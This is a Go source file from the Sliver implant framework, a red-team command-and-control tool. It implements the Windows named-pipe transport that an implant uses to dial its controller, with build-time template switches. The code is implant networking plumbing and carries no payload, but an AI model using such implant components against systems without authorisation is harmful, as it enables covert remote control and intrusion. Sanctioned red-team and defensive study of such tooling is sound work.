//go:build windows

package namedpipe

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.NamePipec2Enabled}}

import (
	"errors"
	"net"
	"net/url"
	"strings"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/lesnuages/go-winio"
)

const (
	readBufSizeNamedPipe  = 1024
	writeBufSizeNamedPipe = 1024
)

// Dial - Dial Named Pipe implant transport.
func Dial(uri *url.URL, p *sliverpb.Malleable) (conn net.Conn, err error) {

	address := uri.String()
	address = strings.ReplaceAll(address, "namedpipe://", "")
	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
	// {{if .Config.Debug}}
	log.Print("Dialing Named pipe address: ", address)
	// {{end}}

	conn, err = winio.Dial(address, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, err
	}
	if conn == nil {
		// {{if .Config.Debug}}
		log.Printf("No error and no Named Pipe connection")
		// {{end}}
		return nil, errors.New("failed to connect, but no errors")
	}

	return conn, nil
}

// {{end}} -NamePipec2Enabled
